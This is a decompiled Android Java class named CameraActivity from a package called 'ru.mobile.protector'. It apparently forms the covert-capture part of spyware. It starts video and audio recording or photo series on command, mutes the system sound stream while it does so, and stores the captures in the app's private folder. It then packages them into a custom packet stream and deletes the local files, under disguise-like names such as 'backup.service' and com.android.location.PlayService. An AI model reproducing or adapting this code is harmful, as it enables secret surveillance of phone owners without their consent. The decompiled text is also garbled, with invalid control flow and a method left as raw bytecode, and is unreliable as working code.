package ru.mobile.protector;

import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.MotionEvent;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.widget.FrameLayout;
import com.android.location.PlayService;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CameraActivity
  extends Activity
{
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final int MAX_PICTURE_SERIES = 32;
  private static final int MAX_VIDEO_DURATION = 1200;
  private static final int MAX_VIDEO_SIZE = 2000000000;
  private static final byte PICTURE_PACKET = 115;
  private static final byte VIDEO_PACKET = 107;
  private static Activity activity;
  private static Context appContext;
  private static String appFilesFolder;
  private static int cameraID;
  private static int duration;
  private static MediaRecorder mediaRecorder;
  private static Camera myCamera;
  private static MyCameraSurfaceView myCameraSurfaceView;
  private static int picCount;
  private static int picInterval;
  private static boolean recording = false;
  
  public CameraActivity() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;) {}
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream) {}
    }
    finally
    {
      paramString = finally;
    }
  }
  
  private static void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public static boolean IsActivityCreated()
  {
    return appContext != null;
  }
  
  public static boolean IsRecordingNow()
  {
    return recording;
  }
  
  public static int StartVideoRecord(int paramInt1, int paramInt2)
  {
    FLOG("StartVideoRecord()");
    if (recording) {
      return 1;
    }
    if (paramInt1 > 1200) {
      return 2;
    }
    if ((paramInt2 != 0) && (paramInt2 != 1)) {
      return 2;
    }
    cameraID = paramInt2;
    duration = paramInt1 * 1000;
    FLOG("Creating mgr()");
    AudioManager localAudioManager = (AudioManager)appContext.getSystemService("audio");
    if (localAudioManager != null)
    {
      FLOG("mgr = " + localAudioManager);
      localAudioManager.setStreamMute(1, true);
    }
    try
    {
      FLOG("releasing camera");
      releaseCamera();
      FLOG("prepareMediaRecorder");
      if (!prepareMediaRecorder()) {
        FLOG("failed to init media recorder");
      }
      FLOG("start recording");
      recording = true;
      FLOG("videoTimer");
      videoTimer(duration);
      FLOG("mediaRecorder.start = " + mediaRecorder);
      if (mediaRecorder != null)
      {
        mediaRecorder.start();
        return 0;
      }
      FLOG("Media recorder failed to create");
      return 4;
    }
    catch (NullPointerException localNullPointerException)
    {
      PlayService.EXCEPT(localNullPointerException, "StartVideoRecord");
    }
    return 3;
  }
  
  public static int TakeSeveralPictures(int paramInt1, int paramInt2, byte paramByte)
  {
    if (recording) {
      return 1;
    }
    if (paramInt1 > 32) {
      return 2;
    }
    if ((paramByte != 0) && (paramByte != 1)) {
      return 2;
    }
    cameraID = paramByte;
    picCount = paramInt1;
    picInterval = paramInt2 * 1000;
    try
    {
      releaseCamera();
      myCamera = getCameraInstance(cameraID);
      myCamera.setPreviewDisplay(myCameraSurfaceView.mHolder);
      myCamera.startPreview();
      recording = true;
      FLOG("starting picture series");
      takePic(picCount, picInterval);
      return 0;
    }
    catch (NullPointerException localNullPointerException)
    {
      localNullPointerException.printStackTrace();
      return 3;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
    }
    return 3;
  }
  
  private static String findNextFile(boolean paramBoolean)
  {
    FLOG("findNextFile " + appFilesFolder);
    if (appFilesFolder == null) {}
    for (;;)
    {
      return null;
      Object localObject = new File(appFilesFolder);
      if (localObject == null)
      {
        FLOG("No appfolder found!");
        return null;
      }
      localObject = ((File)localObject).listFiles();
      if (localObject != null)
      {
        int i = 0;
        while (i < localObject.length)
        {
          if (paramBoolean)
          {
            if ((localObject[i].getName().startsWith("video")) && (localObject[i].getName().endsWith(".tmp"))) {
              return localObject[i].getName();
            }
          }
          else if ((localObject[i].getName().startsWith("photo")) && (localObject[i].getName().endsWith(".tmp"))) {
            return localObject[i].getName();
          }
          i += 1;
        }
      }
    }
  }
  
  private static Camera getCameraInstance(int paramInt)
  {
    if (paramInt == 1) {}
    try
    {
      if (Camera.getNumberOfCameras() >= 2) {
        return Camera.open(1);
      }
      return Camera.open(0);
    }
    catch (Exception localException)
    {
      Camera localCamera;
      FLOG("Camera is not available (in use or does not exist)");
    }
    localCamera = Camera.open(0);
    return localCamera;
    return null;
  }
  
  private static String getDateFromTimestamp(long paramLong)
  {
    try
    {
      Object localObject = Calendar.getInstance();
      ((Calendar)localObject).setTimeInMillis(1000L * paramLong);
      localObject = new SimpleDateFormat("yyyy-MM-dd HH:mm").format(((Calendar)localObject).getTime());
      return localObject;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return "";
  }
  
  public static int getNextPhotoRecord(FileOutputStream paramFileOutputStream)
  {
    String str = findNextFile(false);
    if (str != null)
    {
      FLOG("find file: " + str);
      File localFile = new File(appFilesFolder + "/" + str);
      long l = Long.valueOf(getTimestampFromString(str)).longValue();
      try
      {
        paramFileOutputStream.write(115);
        AddData(paramFileOutputStream, localFile.length());
        AddData(paramFileOutputStream, "0");
        AddData(paramFileOutputStream, l);
        AddData(paramFileOutputStream, "");
        AddData(paramFileOutputStream, "");
        AddData(paramFileOutputStream, "Camera " + getDateFromTimestamp(l));
        writeFileToOutputStream(paramFileOutputStream, localFile);
        paramFileOutputStream.write(1);
        paramFileOutputStream.write(3);
        paramFileOutputStream.write(2);
        localFile.delete();
        return 1;
      }
      catch (Exception paramFileOutputStream)
      {
        paramFileOutputStream.printStackTrace();
        return 1;
      }
    }
    return 0;
  }
  
  public static int getNextVideoRecord(FileOutputStream paramFileOutputStream)
  {
    if (recording) {
      FLOG("recoding, skip pickup video file");
    }
    String str;
    do
    {
      return 0;
      str = findNextFile(true);
    } while (str == null);
    FLOG("find file: " + str);
    File localFile = new File(appFilesFolder + "/" + str);
    long l = Long.valueOf(getTimestampFromString(str)).longValue();
    try
    {
      paramFileOutputStream.write(107);
      AddData(paramFileOutputStream, localFile.length());
      AddData(paramFileOutputStream, "0");
      AddData(paramFileOutputStream, l);
      AddData(paramFileOutputStream, "0");
      AddData(paramFileOutputStream, "0");
      AddData(paramFileOutputStream, "");
      AddData(paramFileOutputStream, "");
      AddData(paramFileOutputStream, "Camera");
      AddData(paramFileOutputStream, "video/mp4");
      AddData(paramFileOutputStream, "Camera " + getDateFromTimestamp(l));
      writeFileToOutputStream(paramFileOutputStream, localFile);
      paramFileOutputStream.write(1);
      paramFileOutputStream.write(3);
      paramFileOutputStream.write(2);
      localFile.delete();
      return 1;
    }
    catch (Exception paramFileOutputStream)
    {
      for (;;)
      {
        paramFileOutputStream.printStackTrace();
      }
    }
  }
  
  private static String getTimestampFromString(String paramString)
  {
    paramString = Pattern.compile("\\d{10}").matcher(paramString);
    if (paramString.find()) {
      return paramString.group(0);
    }
    return "";
  }
  
  private static boolean prepareMediaRecorder()
  {
    FLOG("prepareMediaRecorder()");
    if (myCameraSurfaceView == null)
    {
      FLOG("myCameraSurfaceView gonna be null");
      return false;
    }
    myCamera = getCameraInstance(cameraID);
    FLOG("releaseMediaRecorder()");
    releaseMediaRecorder();
    FLOG("new MediaRecorder()");
    mediaRecorder = new MediaRecorder();
    FLOG("unlock()");
    myCamera.unlock();
    FLOG("setCamera()");
    mediaRecorder.setCamera(myCamera);
    mediaRecorder.setAudioSource(5);
    mediaRecorder.setVideoSource(1);
    FLOG("setProfile()");
    mediaRecorder.setProfile(CamcorderProfile.get(cameraID, 1));
    mediaRecorder.setOutputFile(appFilesFolder + "/video" + System.currentTimeMillis() / 1000L + ".tmp");
    mediaRecorder.setMaxDuration(duration);
    mediaRecorder.setMaxFileSize(2000000000L);
    mediaRecorder.setPreviewDisplay(myCameraSurfaceView.getHolder().getSurface());
    FLOG("prepare()");
    try
    {
      mediaRecorder.prepare();
      return true;
    }
    catch (IllegalStateException localIllegalStateException)
    {
      releaseMediaRecorder();
      return false;
    }
    catch (IOException localIOException)
    {
      releaseMediaRecorder();
    }
    return false;
  }
  
  private static void releaseCamera()
  {
    if (myCamera != null)
    {
      myCamera.release();
      myCamera = null;
    }
  }
  
  private static void releaseMediaRecorder()
  {
    if (mediaRecorder != null)
    {
      mediaRecorder.reset();
      mediaRecorder.release();
      mediaRecorder = null;
      myCamera.lock();
    }
  }
  
  public static void returnSoundMode() {}
  
  public static void stopVideoRecording()
  {
    FLOG("camera activity finished (call)");
    activity.finish();
  }
  
  private static void takePic(int paramInt1, final int paramInt2)
  {
    try
    {
      myCamera.takePicture(null, null, new Camera.PictureCallback()
      {
        public void onPictureTaken(byte[] paramAnonymousArrayOfByte, Camera paramAnonymousCamera)
        {
          try
          {
            CameraActivity.FLOG("picture taken " + this.val$count);
            paramAnonymousCamera = new FileOutputStream(CameraActivity.appFilesFolder + "/photo" + System.currentTimeMillis() / 1000L + ".tmp");
            paramAnonymousCamera.write(paramAnonymousArrayOfByte);
            paramAnonymousCamera.close();
            if (this.val$count <= 1)
            {
              CameraActivity.FLOG("finishing picture series");
              CameraActivity.recording = false;
              return;
            }
            Thread.sleep(paramInt2);
            CameraActivity.takePic(this.val$count - 1, paramInt2);
            return;
          }
          catch (Exception paramAnonymousArrayOfByte)
          {
            paramAnonymousArrayOfByte.printStackTrace();
          }
        }
      });
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  private static void videoTimer(int paramInt)
  {
    new AsyncTask()
    {
      protected Void doInBackground(Void... paramAnonymousVarArgs)
      {
        try
        {
          Thread.sleep(this.val$interval);
          return null;
        }
        catch (InterruptedException paramAnonymousVarArgs)
        {
          for (;;)
          {
            paramAnonymousVarArgs.printStackTrace();
          }
        }
      }
      
      protected void onPostExecute(Void paramAnonymousVoid)
      {
        CameraActivity.recording = false;
        CameraActivity.FLOG("recording finished");
        CameraActivity.activity.finish();
        super.onPostExecute(paramAnonymousVoid);
      }
    }.execute(new Void[0]);
  }
  
  /* Error */
  private static void writeFileToOutputStream(OutputStream paramOutputStream, File paramFile)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: new 470	java/io/FileInputStream
    //   8: dup
    //   9: aload_1
    //   10: invokespecial 473	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   13: astore_1
    //   14: sipush 4096
    //   17: newarray byte
    //   19: astore_3
    //   20: aload_1
    //   21: aload_3
    //   22: invokevirtual 477	java/io/FileInputStream:read	([B)I
    //   25: istore_2
    //   26: iload_2
    //   27: ifgt +12 -> 39
    //   30: aload_1
    //   31: ifnull +60 -> 91
    //   34: aload_1
    //   35: invokevirtual 480	java/io/FileInputStream:close	()V
    //   38: return
    //   39: aload_0
    //   40: aload_3
    //   41: iconst_0
    //   42: iload_2
    //   43: invokevirtual 483	java/io/OutputStream:write	([BII)V
    //   46: goto -26 -> 20
    //   49: astore_0
    //   50: aload_1
    //   51: ifnull -13 -> 38
    //   54: aload_1
    //   55: invokevirtual 480	java/io/FileInputStream:close	()V
    //   58: return
    //   59: astore_0
    //   60: return
    //   61: astore_0
    //   62: aload_3
    //   63: astore_1
    //   64: aload_1
    //   65: ifnull +7 -> 72
    //   68: aload_1
    //   69: invokevirtual 480	java/io/FileInputStream:close	()V
    //   72: aload_0
    //   73: athrow
    //   74: astore_0
    //   75: return
    //   76: astore_1
    //   77: goto -5 -> 72
    //   80: astore_0
    //   81: goto -17 -> 64
    //   84: astore_0
    //   85: aload 4
    //   87: astore_1
    //   88: goto -38 -> 50
    //   91: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	92	0	paramOutputStream	OutputStream
    //   0	92	1	paramFile	File
    //   25	18	2	i	int
    //   1	62	3	arrayOfByte	byte[]
    //   3	83	4	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   14	20	49	java/lang/Exception
    //   20	26	49	java/lang/Exception
    //   39	46	49	java/lang/Exception
    //   54	58	59	java/io/IOException
    //   5	14	61	finally
    //   34	38	74	java/io/IOException
    //   68	72	76	java/io/IOException
    //   14	20	80	finally
    //   20	26	80	finally
    //   39	46	80	finally
    //   5	14	84	java/lang/Exception
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    Log.v("backup.service", "ONCREATE!!!!!!!!!!!!!!!!!!!!!!!!!");
    Log.v("backup.service", "Camera Activity created1");
    Log.v("backup.service", "Camera Activity created2");
    setContentView(2130903040);
    Log.v("backup.service", "Camera Activity created3");
    activity = this;
    appContext = getApplicationContext();
    myCameraSurfaceView = new MyCameraSurfaceView(this, myCamera);
    ((FrameLayout)findViewById(2131034112)).addView(myCameraSurfaceView);
    myCamera = getCameraInstance(cameraID);
    if (myCamera == null) {
      FLOG("Fail to get Camera");
    }
    appFilesFolder = getApplicationInfo().dataDir + "/files";
    paramBundle = new File(appFilesFolder);
    if (!paramBundle.exists()) {
      paramBundle.mkdir();
    }
    recording = false;
  }
  
  protected void onDestroy()
  {
    FLOG("destroy camera activity");
    releaseMediaRecorder();
    releaseCamera();
    ((AudioManager)getSystemService("audio")).setStreamMute(1, false);
    super.onDestroy();
  }
  
  public boolean onTouchEvent(MotionEvent paramMotionEvent)
  {
    FLOG("camera activity finished (touch)");
    finish();
    return super.onTouchEvent(paramMotionEvent);
  }
  
  public class MyCameraSurfaceView
    extends SurfaceView
    implements SurfaceHolder.Callback
  {
    private Camera mCamera;
    private SurfaceHolder mHolder;
    
    public MyCameraSurfaceView(Context paramContext, Camera paramCamera)
    {
      super();
      this.mCamera = paramCamera;
      this.mHolder = getHolder();
      this.mHolder.addCallback(this);
      this.mHolder.setType(3);
    }
    
    public void surfaceChanged(SurfaceHolder paramSurfaceHolder, int paramInt1, int paramInt2, int paramInt3)
    {
      if (this.mHolder.getSurface() == null) {
        return;
      }
      try
      {
        this.mCamera.stopPreview();
        try
        {
          this.mCamera.setPreviewDisplay(this.mHolder);
          this.mCamera.startPreview();
          return;
        }
        catch (Exception paramSurfaceHolder) {}
      }
      catch (Exception paramSurfaceHolder)
      {
        for (;;) {}
      }
    }
    
    public void surfaceCreated(SurfaceHolder paramSurfaceHolder)
    {
      try
      {
        this.mCamera.setPreviewDisplay(paramSurfaceHolder);
        this.mCamera.startPreview();
        return;
      }
      catch (Exception paramSurfaceHolder) {}
    }
    
    public void surfaceDestroyed(SurfaceHolder paramSurfaceHolder) {}
  }
}
